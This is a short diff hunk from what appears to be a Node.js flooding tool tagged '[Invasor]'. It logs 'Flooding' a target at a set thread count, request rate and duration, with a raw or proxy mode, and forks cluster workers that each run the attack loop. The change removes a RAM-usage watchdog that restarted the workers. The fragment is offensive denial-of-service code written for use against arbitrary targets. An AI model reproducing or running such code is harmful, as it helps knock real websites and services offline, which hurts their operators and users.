@@ -93,37 +93,11 @@ if (isNaN(rps) || rps <= 0) {
 	console.error('number rps');
 	process.exit(1);
 }
-const MAX_RAM_PERCENTAGE = 70;
-const RESTART_DELAY = 1000;
 if (cluster.isMaster) {
 	console.log(`[Invasor] Flooding ${target} | ${thread} threads | ${rps} rps | ${time}s | mode: ${proxyr === 'raw' ? 'raw' : 'proxy'}`);
 	for (let counter = 1; counter <= thread; counter++) {
 		cluster.fork();
 	}
-	const l = () => {
-        for (const id in cluster.workers) {
-            cluster.workers[id].kill();
-        }
-
-        console.log('[>] Restarting the script via', RESTART_DELAY, 'ms...');
-        setTimeout(() => {
-            for (let counter = 1; counter <= thread; counter++) {
-                cluster.fork();
-            }
-        }, RESTART_DELAY);
-    };
-
-    const m = () => {
-        const totalRAM = os.totalmem();
-        const usedRAM = totalRAM - os.freemem();
-        const ramPercentage = (usedRAM / totalRAM) * 100;
-
-        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
-            console.log('[!] Maximum RAM usage percentage exceeded:', ramPercentage.toFixed(2), '%');
-            l();
-        }
-    };
-	setInterval(m, 5000);
 	setTimeout(() => process.exit(-1), time * 1000);
 } else {
 	setInterval(d)
